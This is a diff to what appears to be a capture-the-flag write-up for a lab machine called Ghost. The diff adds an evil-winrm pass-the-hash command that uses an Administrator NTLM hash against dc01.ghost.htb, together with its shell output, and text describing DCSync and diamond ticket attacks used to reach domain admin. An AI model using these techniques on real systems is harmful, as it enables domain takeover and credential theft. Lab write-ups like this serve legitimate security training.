@@ -1264,10 +1264,24 @@ Ill get a shell as SYSTEM thanks to SigmaPotato
 # Domain Admin
 
 ```python
-
+evil-winrm -i dc01.ghost.htb -u Administrator -H '1cdb17d5c14ff69e7067cffcc9e470bd'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
+ghost\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
 ```
 
 Then performing a diamond ticket attack using my beacon and the built in BOFs to get domain admin
 
 This was first accomplished by doing a DCSync attack on the `PRIMARY` server since i was SYSTEM and getting the aes256 key of the krbtgt user account of the `corp.ghost.htb` domain
+
+Then using it to perform a diamond ticket to get Domain admin!
 
